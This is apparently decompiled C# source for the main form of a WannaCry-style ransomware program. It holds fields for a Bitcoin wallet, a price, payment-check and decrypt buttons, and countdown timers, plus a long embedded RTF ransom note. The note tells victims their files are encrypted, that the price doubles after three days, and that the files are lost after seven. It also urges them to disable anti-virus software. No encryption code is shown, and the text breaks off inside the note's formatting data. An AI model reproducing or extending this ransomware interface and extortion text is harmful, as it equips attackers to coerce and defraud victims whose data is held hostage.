using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Windows.Forms;
using Microsoft.Win32;
using wg.Properties;

namespace wg;

public class MainForm : Form
{
	private DateTime startTime;

	private DateTime x2Time;

	private DateTime endTime;

	private IContainer components;

	private Button CheckPayment;

	private Button Decrypt;

	private LinkLabel Contact;

	private LinkLabel About;

	private LinkLabel Howto;

	private Label Oops;

	private PictureBox Lock;

	private PictureBox TimeLeft;

	private PictureBox RiseProgress;

	private PictureBox LostProgress;

	private PictureBox pictureBox2;

	private RichTextBox Help;

	private Label Wallet;

	private PictureBox Copy;

	private Label Price;

	private Timer Counter;

	private Label RiseDateLbl;

	private Label EraseDateLbl;

	private Label RiseTimeLeft;

	private Label EraseTimeLeft;

	public MainForm()
	{
		InitializeComponent();
		Help.set_Rtf("{\\rtf1\\adeflang1025\\ansi\\ansicpg1252\\uc2\\adeff31507\\deff0\\stshfdbch31505\\stshfloch31506\\stshfhich31506\\stshfbi0\\deflang1033\\deflangfe1042\\themelang1033\\themelangfe1042\\themelangcs0{\\fonttbl{\\f0\\fbidi \\froman\\fcharset0\\fprq2{\\*\\panose 02020603050405020304}Times New Roman;}{\\f1\\fbidi \\fswiss\\fcharset0\\fprq2{\\*\\panose 020b0604020202020204}Arial;}\r\n{\\f34\\fbidi \\froman\\fcharset0\\fprq2{\\*\\panose 02040503050406030204}Cambria Math;}{\\f37\\fbidi \\froman\\fcharset0\\fprq2{\\*\\panose 02040503050406030204}Cambria;}{\\f41\\fbidi \\fmodern\\fcharset0\\fprq1{\\*\\panose 020b0609020204030204}Consolas;}\r\n{\\f53\\fbidi \\fmodern\\fcharset129\\fprq1{\\*\\panose 020b0609000101010101}\\'b1\\'bc\\'b8\\'b2\\'c3\\'bc;}{\\f54\\fbidi \\fmodern\\fcharset129\\fprq1{\\*\\panose 020b0609000101010101}@\\'b1\\'bc\\'b8\\'b2\\'c3\\'bc;}\r\n{\\flomajor\\f31500\\fbidi \\froman\\fcharset0\\fprq2{\\*\\panose 02020603050405020304}Times New Roman;}{\\fdbmajor\\f31501\\fbidi \\fmodern\\fcharset129\\fprq2{\\*\\panose 020b0503020000020004}\\'b8\\'bc\\'c0\\'ba \\'b0\\'ed\\'b5\\'f1;}\r\n{\\fhimajor\\f31502\\fbidi \\froman\\fcharset0\\fprq2{\\*\\panose 02040503050406030204}Cambria;}{\\fbimajor\\f31503\\fbidi \\froman\\fcharset0\\fprq2{\\*\\panose 02020603050405020304}Times New Roman;}\r\n{\\flominor\\f31504\\fbidi \\froman\\fcharset0\\fprq2{\\*\\panose 02020603050405020304}Times New Roman;}{\\fdbminor\\f31505\\fbidi \\fmodern\\fcharset129\\fprq2{\\*\\panose 020b0503020000020004}\\'b8\\'bc\\'c0\\'ba \\'b0\\'ed\\'b5\\'f1;}\r\n{\\fhiminor\\f31506\\fbidi \\fswiss\\fcharset0\\fprq2{\\*\\panose 020f0502020204030204}Calibri;}{\\fbiminor\\f31507\\fbidi \\froman\\fcharset0\\fprq2{\\*\\panose 02020603050405020304}Times New Roman;}{\\f540\\fbidi \\froman\\fcharset238\\fprq2 Times New Roman CE;}\r\n{\\f541\\fbidi \\froman\\fcharset204\\fprq2 Times New Roman Cyr;}{\\f543\\fbidi \\froman\\fcharset161\\fprq2 Times New Roman Greek;}{\\f544\\fbidi \\froman\\fcharset162\\fprq2 Times New Roman Tur;}{\\f545\\fbidi \\froman\\fcharset177\\fprq2 Times New Roman (Hebrew);}\r\n{\\f546\\fbidi \\froman\\fcharset178\\fprq2 Times New Roman (Arabic);}{\\f547\\fbidi \\froman\\fcharset186\\fprq2 Times New Roman Baltic;}{\\f548\\fbidi \\froman\\fcharset163\\fprq2 Times New Roman (Vietnamese);}{\\f550\\fbidi \\fswiss\\fcharset238\\fprq2 Arial CE;}\r\n{\\f551\\fbidi \\fswiss\\fcharset204\\fprq2 Arial Cyr;}{\\f553\\fbidi \\fswiss\\fcharset161\\fprq2 Arial Greek;}{\\f554\\fbidi \\fswiss\\fcharset162\\fprq2 Arial Tur;}{\\f555\\fbidi \\fswiss\\fcharset177\\fprq2 Arial (Hebrew);}\r\n{\\f556\\fbidi \\fswiss\\fcharset178\\fprq2 Arial (Arabic);}{\\f557\\fbidi \\fswiss\\fcharset186\\fprq2 Arial Baltic;}{\\f558\\fbidi \\fswiss\\fcharset163\\fprq2 Arial (Vietnamese);}{\\f880\\fbidi \\froman\\fcharset238\\fprq2 Cambria Math CE;}\r\n{\\f881\\fbidi \\froman\\fcharset204\\fprq2 Cambria Math Cyr;}{\\f883\\fbidi \\froman\\fcharset161\\fprq2 Cambria Math Greek;}{\\f884\\fbidi \\froman\\fcharset162\\fprq2 Cambria Math Tur;}{\\f887\\fbidi \\froman\\fcharset186\\fprq2 Cambria Math Baltic;}\r\n{\\f888\\fbidi \\froman\\fcharset163\\fprq2 Cambria Math (Vietnamese);}{\\f910\\fbidi \\froman\\fcharset238\\fprq2 Cambria CE;}{\\f911\\fbidi \\froman\\fcharset204\\fprq2 Cambria Cyr;}{\\f913\\fbidi \\froman\\fcharset161\\fprq2 Cambria Greek;}\r\n{\\f914\\fbidi \\froman\\fcharset162\\fprq2 Cambria Tur;}{\\f917\\fbidi \\froman\\fcharset186\\fprq2 Cambria Baltic;}{\\f918\\fbidi \\froman\\fcharset163\\fprq2 Cambria (Vietnamese);}{\\f950\\fbidi \\fmodern\\fcharset238\\fprq1 Consolas CE;}\r\n{\\f951\\fbidi \\fmodern\\fcharset204\\fprq1 Consolas Cyr;}{\\f953\\fbidi \\fmodern\\fcharset161\\fprq1 Consolas Greek;}{\\f954\\fbidi \\fmodern\\fcharset162\\fprq1 Consolas Tur;}{\\f957\\fbidi \\fmodern\\fcharset186\\fprq1 Consolas Baltic;}\r\n{\\f958\\fbidi \\fmodern\\fcharset163\\fprq1 Consolas (Vietnamese);}{\\f1072\\fbidi \\fmodern\\fcharset0\\fprq1 GulimChe Western;}{\\f1070\\fbidi \\fmodern\\fcharset238\\fprq1 GulimChe CE;}{\\f1071\\fbidi \\fmodern\\fcharset204\\fprq1 GulimChe Cyr;}\r\n{\\f1073\\fbidi \\fmodern\\fcharset161\\fprq1 GulimChe Greek;}{\\f1074\\fbidi \\fmodern\\fcharset162\\fprq1 GulimChe Tur;}{\\f1077\\fbidi \\fmodern\\fcharset186\\fprq1 GulimChe Baltic;}{\\f1082\\fbidi \\fmodern\\fcharset0\\fprq1 @\\'b1\\'bc\\'b8\\'b2\\'c3\\'bc Western;}\r\n{\\f1080\\fbidi \\fmodern\\fcharset238\\fprq1 @\\'b1\\'bc\\'b8\\'b2\\'c3\\'bc CE;}{\\f1081\\fbidi \\fmodern\\fcharset204\\fprq1 @\\'b1\\'bc\\'b8\\'b2\\'c3\\'bc Cyr;}{\\f1083\\fbidi \\fmodern\\fcharset161\\fprq1 @\\'b1\\'bc\\'b8\\'b2\\'c3\\'bc Greek;}\r\n{\\f1084\\fbidi \\fmodern\\fcharset162\\fprq1 @\\'b1\\'bc\\'b8\\'b2\\'c3\\'bc Tur;}{\\f1087\\fbidi \\fmodern\\fcharset186\\fprq1 @\\'b1\\'bc\\'b8\\'b2\\'c3\\'bc Baltic;}{\\flomajor\\f31508\\fbidi \\froman\\fcharset238\\fprq2 Times New Roman CE;}\r\n{\\flomajor\\f31509\\fbidi \\froman\\fcharset204\\fprq2 Times New Roman Cyr;}{\\flomajor\\f31511\\fbidi \\froman\\fcharset161\\fprq2 Times New Roman Greek;}{\\flomajor\\f31512\\fbidi \\froman\\fcharset162\\fprq2 Times New Roman Tur;}\r\n{\\flomajor\\f31513\\fbidi \\froman\\fcharset177\\fprq2 Times New Roman (Hebrew);}{\\flomajor\\f31514\\fbidi \\froman\\fcharset178\\fprq2 Times New Roman (Arabic);}{\\flomajor\\f31515\\fbidi \\froman\\fcharset186\\fprq2 Times New Roman Baltic;}\r\n{\\flomajor\\f31516\\fbidi \\froman\\fcharset163\\fprq2 Times New Roman (Vietnamese);}{\\fdbmajor\\f31520\\fbidi \\fmodern\\fcharset0\\fprq2 Malgun Gothic Western;}{\\fhimajor\\f31528\\fbidi \\froman\\fcharset238\\fprq2 Cambria CE;}\r\n{\\fhimajor\\f31529\\fbidi \\froman\\fcharset204\\fprq2 Cambria Cyr;}{\\fhimajor\\f31531\\fbidi \\froman\\fcharset161\\fprq2 Cambria Greek;}{\\fhimajor\\f31532\\fbidi \\froman\\fcharset162\\fprq2 Cambria Tur;}\r\n{\\fhimajor\\f31535\\fbidi \\froman\\fcharset186\\fprq2 Cambria Baltic;}{\\fhimajor\\f31536\\fbidi \\froman\\fcharset163\\fprq2 Cambria (Vietnamese);}{\\fbimajor\\f31538\\fbidi \\froman\\fcharset238\\fprq2 Times New Roman CE;}\r\n{\\fbimajor\\f31539\\fbidi \\froman\\fcharset204\\fprq2 Times New Roman Cyr;}{\\fbimajor\\f31541\\fbidi \\froman\\fcharset161\\fprq2 Times New Roman Greek;}{\\fbimajor\\f31542\\fbidi \\froman\\fcharset162\\fprq2 Times New Roman Tur;}\r\n{\\fbimajor\\f31543\\fbidi \\froman\\fcharset177\\fprq2 Times New Roman (Hebrew);}{\\fbimajor\\f31544\\fbidi \\froman\\fcharset178\\fprq2 Times New Roman (Arabic);}{\\fbimajor\\f31545\\fbidi \\froman\\fcharset186\\fprq2 Times New Roman Baltic;}\r\n{\\fbimajor\\f31546\\fbidi \\froman\\fcharset163\\fprq2 Times New Roman (Vietnamese);}{\\flominor\\f31548\\fbidi \\froman\\fcharset238\\fprq2 Times New Roman CE;}{\\flominor\\f31549\\fbidi \\froman\\fcharset204\\fprq2 Times New Roman Cyr;}\r\n{\\flominor\\f31551\\fbidi \\froman\\fcharset161\\fprq2 Times New Roman Greek;}{\\flominor\\f31552\\fbidi \\froman\\fcharset162\\fprq2 Times New Roman Tur;}{\\flominor\\f31553\\fbidi \\froman\\fcharset177\\fprq2 Times New Roman (Hebrew);}\r\n{\\flominor\\f31554\\fbidi \\froman\\fcharset178\\fprq2 Times New Roman (Arabic);}{\\flominor\\f31555\\fbidi \\froman\\fcharset186\\fprq2 Times New Roman Baltic;}{\\flominor\\f31556\\fbidi \\froman\\fcharset163\\fprq2 Times New Roman (Vietnamese);}\r\n{\\fdbminor\\f31560\\fbidi \\fmodern\\fcharset0\\fprq2 Malgun Gothic Western;}{\\fhiminor\\f31568\\fbidi \\fswiss\\fcharset238\\fprq2 Calibri CE;}{\\fhiminor\\f31569\\fbidi \\fswiss\\fcharset204\\fprq2 Calibri Cyr;}\r\n{\\fhiminor\\f31571\\fbidi \\fswiss\\fcharset161\\fprq2 Calibri Greek;}{\\fhiminor\\f31572\\fbidi \\fswiss\\fcharset162\\fprq2 Calibri Tur;}{\\fhiminor\\f31575\\fbidi \\fswiss\\fcharset186\\fprq2 Calibri Baltic;}\r\n{\\fhiminor\\f31576\\fbidi \\fswiss\\fcharset163\\fprq2 Calibri (Vietnamese);}{\\fbiminor\\f31578\\fbidi \\froman\\fcharset238\\fprq2 Times New Roman CE;}{\\fbiminor\\f31579\\fbidi \\froman\\fcharset204\\fprq2 Times New Roman Cyr;}\r\n{\\fbiminor\\f31581\\fbidi \\froman\\fcharset161\\fprq2 Times New Roman Greek;}{\\fbiminor\\f31582\\fbidi \\froman\\fcharset162\\fprq2 Times New Roman Tur;}{\\fbiminor\\f31583\\fbidi \\froman\\fcharset177\\fprq2 Times New Roman (Hebrew);}\r\n{\\fbiminor\\f31584\\fbidi \\froman\\fcharset178\\fprq2 Times New Roman (Arabic);}{\\fbiminor\\f31585\\fbidi \\froman\\fcharset186\\fprq2 Times New Roman Baltic;}{\\fbiminor\\f31586\\fbidi \\froman\\fcharset163\\fprq2 Times New Roman (Vietnamese);}}\r\n{\\colortbl;\\red0\\green0\\blue0;\\red0\\green0\\blue255;\\red0\\green255\\blue255;\\red0\\green255\\blue0;\\red255\\green0\\blue255;\\red255\\green0\\blue0;\\red255\\green255\\blue0;\\red255\\green255\\blue255;\\red0\\green0\\blue128;\\red0\\green128\\blue128;\\red0\\green128\\blue0;\r\n\\red128\\green0\\blue128;\\red128\\green0\\blue0;\\red128\\green128\\blue0;\\red128\\green128\\blue128;\\red192\\green192\\blue192;}{\\*\\defchp \\fs22\\loch\\af31506\\hich\\af31506\\dbch\\af31505 }{\\*\\defpap \\ql \\li0\\ri0\\sa200\\sl276\\slmult1\r\n\\widctlpar\\wrapdefault\\aspalpha\\aspnum\\faauto\\adjustright\\rin0\\lin0\\itap0 }\\noqfpromote {\\stylesheet{\\ql \\li0\\ri0\\sa200\\sl276\\slmult1\\widctlpar\\wrapdefault\\aspalpha\\aspnum\\faauto\\adjustright\\rin0\\lin0\\itap0 \\rtlch\\fcs1 \\af31507\\afs22\\alang1025 \r\n\\ltrch\\fcs0 \\fs22\\lang1033\\langfe1042\\loch\\f31506\\hich\\af31506\\dbch\\af31505\\cgrid\\langnp1033\\langfenp1042 \\snext0 \\sqformat \\spriority0 \\styrsid1847526 Normal;}{\\*\\cs10 \\additive \\ssemihidden \\sunhideused \\spriority1 Default Paragraph Font;}{\\*\r\n\\ts11\\tsrowd\\trftsWidthB3\\trpaddl108\\trpaddr108\\trpaddfl3\\trpaddft3\\trpaddfb3\\trpaddfr3\\trcbpat1\\trcfpat1\\tblind0\\tblindtype3\\tscellwidthfts0\\tsvertalt\\tsbrdrt\\tsbrdrl\\tsbrdrb\\tsbrdrr\\tsbrdrdgl\\tsbrdrdgr\\tsbrdrh\\tsbrdrv \\ql \\li0\\ri0\\sa200\\sl276\\slmult1\r\n\\widctlpar\\wrapdefault\\aspalpha\\aspnum\\faauto\\adjustright\\rin0\\lin0\\itap0 \\rtlch\\fcs1 \\af0\\afs22\\alang1025 \\ltrch\\fcs0 \\fs22\\lang1033\\langfe1042\\loch\\f31506\\hich\\af31506\\dbch\\af31505\\cgrid\\langnp1033\\langfenp1042 \r\n\\snext11 \\ssemihidden \\sunhideused \\sqformat Normal Table;}{\\s15\\ql \\li0\\ri0\\widctlpar\\wrapdefault\\aspalpha\\aspnum\\faauto\\adjustright\\rin0\\lin0\\itap0 \\rtlch\\fcs1 \\af41\\afs21\\alang1025 \\ltrch\\fcs0 \r\n\\fs21\\lang1033\\langfe1042\\loch\\f41\\hich\\af41\\dbch\\af31505\\cgrid\\langnp1033\\langfenp1042 \\sbasedon0 \\snext15 \\slink16 \\sunhideused \\styrsid5268979 Plain Text;}{\\*\\cs16 \\additive \\rtlch\\fcs1 \\af41\\afs21 \\ltrch\\fcs0 \\f41\\fs21 \r\n\\sbasedon10 \\slink15 \\slocked \\styrsid5268979 Plain Text Char;}}{\\*\\rsidtbl \\rsid1847526\\rsid2183709\\rsid5268979\\rsid5733561\\rsid11488848\\rsid14178431\\rsid14237745\\rsid14313477\\rsid14432744}{\\mmathPr\\mmathFont34\\mbrkBin0\\mbrkBinSub0\\msmallFrac0\\mdispDef1\r\n\\mlMargin0\\mrMargin0\\mdefJc1\\mwrapIndent1440\\mintLim0\\mnaryLim1}{\\info{\\author Messi}{\\operator Messi}{\\creatim\\yr2017\\mo5\\dy11\\hr13\\min53}{\\revtim\\yr2017\\mo5\\dy11\\hr14\\min42}{\\version4}{\\edmins4}{\\nofpages1}{\\nofwords296}{\\nofchars1385}{\\nofcharsws1678}\r\n{\\vern32775}}{\\*\\xmlnstbl {\\xmlns1 http://schemas.microsoft.com/office/word/2003/wordml}}\\paperw12240\\paperh15840\\margl1501\\margr1502\\margt1701\\margb1440\\gutter0\\ltrsect \r\n\\widowctrl\\ftnbj\\aenddoc\\trackmoves1\\trackformatting1\\donotembedsysfont1\\relyonvml0\\donotembedlingdata0\\grfdocevents0\\validatexml1\\showplaceholdtext0\\ignoremixedcontent0\\saveinvalidxml0\\showxmlerrors1\\noxlattoyen\r\n\\expshrtn\\noultrlspc\\dntblnsbdb\\nospaceforul\\formshade\\horzdoc\\dgmargin\\dghspace180\\dgvspace180\\dghorigin1501\\dgvorigin1701\\dghshow1\\dgvshow1\r\n\\jexpand\\viewkind1\\viewscale140\\pgbrdrhead\\pgbrdrfoot\\splytwnine\\ftnlytwnine\\htmautsp\\nolnhtadjtbl\\useltbaln\\alntblind\\lytcalctblwd\\lyttblrtgr\\lnbrkrule\\nobrkwrptbl\\snaptogridincell\\allowfieldendsel\\wrppunct\r\n\\asianbrkrule\\rsidroot1847526\\newtblstyruls\\nogrowautofit\\usenormstyforlist\\noindnmbrts\\felnbrelev\\nocxsptable\\indrlsweleven\\noafcnsttbl\\afelev\\utinl\\hwelev\\spltpgpar\\notcvasp\\notbrkcnstfrctbl\\notvatxbx\\krnprsnet\\cachedcolbal \\nouicompat \\fet0\r\n{\\*\\wgrffmtfilter 2450}\\nofeaturethrottle1\\ilfomacatclnup0\\ltrpar \\sectd \\ltrsect\\linex0\\endnhere\\sectlinegrid360\\sectdefaultcl\\sectrsid5268979\\sftnbj {\\*\\pnseclvl1\\pnucrm\\pnstart1\\pnindent720\\pnhang {\\pntxta \\hich .}}{\\*\\pnseclvl2\r\n\\pnucltr\\pnstart1\\pnindent720\\pnhang {\\pntxta \\hich .}}{\\*\\pnseclvl3\\pndec\\pnstart1\\pnindent720\\pnhang {\\pntxta \\hich .}}{\\*\\pnseclvl4\\pnlcltr\\pnstart1\\pnindent720\\pnhang {\\pntxta \\hich )}}{\\*\\pnseclvl5\\pndec\\pnstart1\\pnindent720\\pnhang {\\pntxtb \\hich (}\r\n{\\pntxta \\hich )}}{\\*\\pnseclvl6\\pnlcltr\\pnstart1\\pnindent720\\pnhang {\\pntxtb \\hich (}{\\pntxta \\hich )}}{\\*\\pnseclvl7\\pnlcrm\\pnstart1\\pnindent720\\pnhang {\\pntxtb \\hich (}{\\pntxta \\hich )}}{\\*\\pnseclvl8\\pnlcltr\\pnstart1\\pnindent720\\pnhang {\\pntxtb \\hich (}\r\n{\\pntxta \\hich )}}{\\*\\pnseclvl9\\pnlcrm\\pnstart1\\pnindent720\\pnhang {\\pntxtb \\hich (}{\\pntxta \\hich )}}\\pard\\plain \\ltrpar\\s15\\ql \\li0\\ri0\\widctlpar\\wrapdefault\\aspalpha\\aspnum\\faauto\\adjustright\\rin0\\lin0\\itap0\\pararsid5268979 \\rtlch\\fcs1 \r\n\\af41\\afs21\\alang1025 \\ltrch\\fcs0 \\fs21\\lang1033\\langfe1042\\loch\\af41\\hich\\af41\\dbch\\af31505\\cgrid\\langnp1033\\langfenp1042 {\\rtlch\\fcs1 \\af1\\afs22 \\ltrch\\fcs0 \\b\\fs28\\loch\\af31502\\hich\\af31502\\dbch\\af53\\insrsid14313477\\charrsid5733561 \r\n\\hich\\af31502\\dbch\\af53\\loch\\f31502 What Happened to My Computer?\r\n\\par }{\\rtlch\\fcs1 \\af1\\afs22 \\ltrch\\fcs0 \\b\\fs24\\loch\\af31502\\hich\\af31502\\dbch\\af53\\insrsid14313477\\charrsid5733561 \\hich\\af31502\\dbch\\af53\\loch\\f31502 Y}{\\rtlch\\fcs1 \\af1\\afs22 \\ltrch\\fcs0 \r\n\\fs22\\loch\\af31502\\hich\\af31502\\dbch\\af53\\insrsid14313477\\charrsid5733561 \\hich\\af31502\\dbch\\af53\\loch\\f31502 our important files are encrypted.\r\n\\par \\hich\\af31502\\dbch\\af53\\loch\\f31502 Many of your documents, photos, videos, databases and other files are no longer accessibl\\hich\\af31502\\dbch\\af53\\loch\\f31502 \r\ne because they have been encrypted. Maybe you are busy looking for a way to recover your files, but do not waste your time. Nobody can recover your files without our decryption service.\r\n\\par \r\n\\par }{\\rtlch\\fcs1 \\af1\\afs22 \\ltrch\\fcs0 \\b\\fs28\\loch\\af31502\\hich\\af31502\\dbch\\af53\\insrsid14313477\\charrsid5733561 \\hich\\af31502\\dbch\\af53\\loch\\f31502 Can I Recover My Files?\r\n\\par }{\\rtlch\\fcs1 \\af1\\afs22 \\ltrch\\fcs0 \\b\\fs24\\loch\\af31502\\hich\\af31502\\dbch\\af53\\insrsid14313477\\charrsid5733561 \\hich\\af31502\\dbch\\af53\\loch\\f31502 S}{\\rtlch\\fcs1 \\af1\\afs22 \\ltrch\\fcs0 \r\n\\fs22\\loch\\af31502\\hich\\af31502\\dbch\\af53\\insrsid14313477\\charrsid5733561 \\hich\\af31502\\dbch\\af53\\loch\\f31502 ure. We guarantee that you can recover all y\\hich\\af31502\\dbch\\af53\\loch\\f31502 our files safely and easily. But you have not so enough time.\r\n\r\n\\par \\hich\\af31502\\dbch\\af53\\loch\\f31502 You can decrypt some of your files for free. Try now by clicking <Decrypt>.\r\n\\par \\hich\\af31502\\dbch\\af53\\loch\\f31502 But if you want to decrypt all your files, you need to pay.\r\n\\par \\hich\\af31502\\dbch\\af53\\loch\\f31502 You only have 3 days to submit the payment. After that the\\hich\\af31502\\dbch\\af53\\loch\\f31502  price will be doubled.\r\n\\par \\hich\\af31502\\dbch\\af53\\loch\\f31502 Also, if you don't pay in 7 days, you won't be able to recover your files forever.\r\n\\par \\hich\\af31502\\dbch\\af53\\loch\\f31502 We will have free events for users who are so poor that they couldn't pay in 6 months.\r\n\\par \r\n\\par }{\\rtlch\\fcs1 \\af1\\afs22 \\ltrch\\fcs0 \\b\\fs28\\loch\\af31502\\hich\\af31502\\dbch\\af53\\insrsid14313477\\charrsid5733561 \\hich\\af31502\\dbch\\af53\\loch\\f31502 How Do I Pay?\r\n\\par }{\\rtlch\\fcs1 \\af1\\afs22 \\ltrch\\fcs0 \\b\\fs24\\loch\\af31502\\hich\\af31502\\dbch\\af53\\insrsid14313477\\charrsid5733561 \\hich\\af31502\\dbch\\af53\\loch\\f31502 P}{\\rtlch\\fcs1 \\af1\\afs22 \\ltrch\\fcs0 \r\n\\fs22\\loch\\af31502\\hich\\af31502\\dbch\\af53\\insrsid14313477\\charrsid5733561 \\hich\\af31502\\dbch\\af53\\loch\\f31502 ayment is accepted in Bitcoin only. For more i\\hich\\af31502\\dbch\\af53\\loch\\f31502 nformation, click <About bitcoin>.\r\n\\par \\hich\\af31502\\dbch\\af53\\loch\\f31502 Please check the current price of Bitcoin and buy some bitcoins. For more information, click <How to buy bitcoins>.\r\n\\par \\hich\\af31502\\dbch\\af53\\loch\\f31502 And send the correct amount to the address specified in this window.\r\n\\par \\hich\\af31502\\dbch\\af53\\loch\\f31502 After your payment, click <Check Pay\\hich\\af31502\\dbch\\af53\\loch\\f31502 ment>. Best time to check: 9:00am - 11:00am GMT from Monday to Friday.\r\n\\par \\hich\\af31502\\dbch\\af53\\loch\\f31502 Once the payment is checked, you can start decrypting your files immediately.\r\n\\par \r\n\\par }{\\rtlch\\fcs1 \\af1\\afs22 \\ltrch\\fcs0 \\b\\fs28\\loch\\af31502\\hich\\af31502\\dbch\\af53\\insrsid14313477\\charrsid5733561 \\hich\\af31502\\dbch\\af53\\loch\\f31502 Contact\r\n\\par }{\\rtlch\\fcs1 \\af1\\afs22 \\ltrch\\fcs0 \\fs22\\loch\\af31502\\hich\\af31502\\dbch\\af53\\insrsid14313477\\charrsid5733561 \\hich\\af31502\\dbch\\af53\\loch\\f31502 If you need our assistance, send a message by clicking <Contact Us>.\r\n\\par \r\n\\par }{\\rtlch\\fcs1 \\af1\\afs22 \\ltrch\\fcs0 \\fs22\\cf6\\loch\\af31502\\hich\\af31502\\dbch\\af53\\insrsid14313477\\charrsid5733561 \\hich\\af31502\\dbch\\af53\\loch\\f31502 We strongly recommend you to\\hich\\af31502\\dbch\\af53\\loch\\f31502 \r\n not remove this software, and disable your anti-virus for a while, until you pay and the payment gets processed. If your anti-virus gets updated and removes this software automatically, it will not be able to recover your files even if you pay!}{\r\n\\rtlch\\fcs1 \\af1\\afs22 \\ltrch\\fcs0 \\fs22\\cf6\\loch\\af31502\\hich\\af31502\\dbch\\af53\\insrsid5268979\\charrsid5733561 \r\n\\par }{\\*\\themedata 504b030414000600080000002100828abc13fa0000001c020000130000005b436f6e74656e745f54797065735d2e786d6cac91cb6ac3301045f785fe83d0b6d8\r\n72ba28a5d8cea249777d2cd20f18e4b12d6a8f843409c9df77ecb850ba082d74231062ce997b55ae8fe3a00e1893f354e9555e6885647de3a8abf4fbee29bbd7\r\n2a3150038327acf409935ed7d757e5ee14302999a654e99e393c18936c8f23a4dc072479697d1c81e51a3b13c07e4087e6b628ee8cf5c4489cf1c4d075f92a0b\r\n44d7a07a83c82f308ac7b0a0f0fbf90c2480980b58abc733615aa2d210c2e02cb04430076a7ee833dfb6ce62e3ed7e14693e8317d8cd0433bf5c60f53fea2fe7\r\n065bd80facb647e9e25c7fc421fd2ddb526b2e9373fed4bb902e182e97b7b461e6bfad3f010000ffff0300504b030414000600080000002100a5d6a7e7c00000\r\n00360100000b0000005f72656c732f2e72656c73848fcf6ac3300c87ef85bd83d17d51d2c31825762fa590432fa37d00e1287f68221bdb1bebdb4fc7060abb08\r\n84a4eff7a93dfeae8bf9e194e720169aaa06c3e2433fcb68e1763dbf7f82c985a4a725085b787086a37bdbb55fbc50d1a33ccd311ba548b63095120f88d94fbc\r\n52ae4264d1c910d24a45db3462247fa791715fd71f989e19e0364cd3f51652d73760ae8fa8c9ffb3c330cc9e4fc17faf2ce545046e37944c69e462a1a82fe353\r\nbd90a865aad41ed0b5b8f9d6fd010000ffff0300504b0304140006000800000021006b799616830000008a0000001c0000007468656d652f7468656d652f7468\r\n656d654d616e616765722e786d6c0ccc4d0ac3201040e17da17790d93763bb284562b2cbaebbf600439c1a41c7a0d29fdbd7e5e38337cedf14d59b4b0d592c9c\r\n070d8a65cd2e88b7f07c2ca71ba8da481cc52c6ce1c715e6e97818c9b48d13df49c873517d23d59085adb5dd20d6b52bd521ef2cdd5eb9246a3d8b4757e8d3f7\r\n29e245eb2b260a0238fd010000ffff0300504b03041400060008000000210096b5ade296060000501b0000160000007468656d652f7468656d652f7468656d65\r\n312e786d6cec594f6fdb3614bf0fd87720746f6327761a07758ad8b19b2d4d1bc46e871e698996d850a240d2497d1bdae38001c3ba618715d86d87615b8116d8\r\na5fb34d93a6c1dd0afb0475292c5585e9236d88aad3e2412f9e3fbff1e1fa9abd7eec70c1d1221294fda5efd72cd4324f1794093b0eddd1ef62fad79482a9c04\r\n98f184b4bd2991deb58df7dfbb8ad755446282607d22d771db8b944ad79796a40fc3585ee62949606ecc458c15bc8a702910f808e8c66c69b9565b5d8a314d3c\r\n94e018c8de1a8fa94fd05093f43672e23d06af89927ac06762a049136785c10607758d9053d965021d62d6f6804fc08f86e4bef210c352c144dbab999fb7b471\r\n7509af678b985ab0b6b4ae6f7ed9ba6c4170b06c788a705430adf71bad2b5b057d03606a1ed7ebf5babd7a41cf00b0ef83a6569632cd467faddec9699640f671\r\n9e76b7d6ac355c7c89feca9cccad4ea7d36c65b258a206641f1b73f8b5da6a6373d9c11b90c537e7f08dce66b7bbeae00dc8e257e7f0fd2badd5868b37a088d1\r\ne4600ead1ddaef67d40bc898b3ed4af81ac0d76a197c86826828a24bb318f3442d8ab518dfe3a20f000d6458d104a9694ac6d88728eee2782428d60cf03ac1a5\r\n193be4cbb921cd0b495fd054b5bd0f530c1931a3f7eaf9f7af9e3f45c70f9e1d3ff8e9f8e1c3e3073f5a42ceaa6d9c84e5552fbffdeccfc71fa33f9e7ef3f2d1\r\n17d57859c6fffac327bffcfc793510d26726ce8b2f9ffcf6ecc98baf3efdfdbb4715f04d814765f890c644a29be408edf3181433567125272371be15c308d3f2\r\n8acd249438c19a4b05fd9e8a1cf4cd296699771c393ac4b5e01d01e5a30a787d72cf1178108989a2159c77a2d801ee72ce3a5c545a6147f32a99793849c26ae6\r\n6252c6ed637c58c5bb8b13c7bfbd490a75330f4b47f16e441c31f7184e140e494214d273fc80900aedee52ead87597fa824b3e56e82e451d4c2b4d32a423279a\r\n668bb6690c7e9956e90cfe766cb37b077538abd27a8b1cba48c80acc2a841f12e698f13a9e281c57911ce298950d7e03aba84ac8c154f8655c4f2af074481847\r\nbd804859b5e696007d4b4edfc150b12addbecba6b18b148a1e54d1bc81392f23b7f84137c2715a851dd0242a633f900710a218ed715505dfe56e86e877f0034e\r\n16bafb0e258ebb4faf06b769e888340b103d3311da9750aa9d0a1cd3e4efca31a3508f6d0c5c5c398602f8e2ebc71591f5b616e24dd893aa3261fb44f95d843b\r\n5974bb5c04f4edafb95b7892ec1108f3f98de75dc97d5772bdff7cc95d94cf672db4b3da0a6557f70db629362d72bcb0431e53c6066acac80d699a6409fb44d0\r\n8741bdce9c0e4971624a2378cceaba830b05366b90e0ea23aaa241845368b0eb9e2612ca8c742851ca251ceccc70256d8d87265dd96361531f186c3d9058edf2\r\nc00eafe8e1fc5c509031bb4d680e9f39a3154de0accc56ae644441edd76156d7429d995bdd88664a9dc3ad50197c38af1a0c16d684060441db02565e85f3b966\r\n0d0713cc48a0ed6ef7dedc2dc60b17e92219e180643ed27acffba86e9c94c78ab90980d8a9f0913ee49d62b512b79626fb06dccee2a432bbc60276b9f7dec44b\r\n7904cfbca4f3f6443ab2a49c9c2c41476dafd55c6e7ac8c769db1bc399161ee314bc2e75cf8759081743be1236ec4f4d6693e5336fb672c5dc24a8c33585b5fb\r\n9cc24e1d4885545b58463634cc5416022cd19cacfccb4d30eb45296023fd35a458598360f8d7a4003bbaae25e331f155d9d9a5116d3bfb9a95523e51440ca2e0\r\n088dd844ec6370bf0e55d027a012ae264c45d02f708fa6ad6da6dce29c255df9f6cae0ec38666984b372ab5334cf640b37795cc860de4ae2816e95b21be5ceaf\r\n8a49f90b52a51cc6ff3355f47e0237052b81f6800fd7b802239daf6d8f0b1571a8426944fdbe80c6c1d40e8816b88b8569082ab84c36ff0539d4ff6dce591a26\r\nade1c0a7f669880485fd484582903d284b26fa4e2156cff62e4b9265844c4495c495a9157b440e091bea1ab8aaf7760f4510e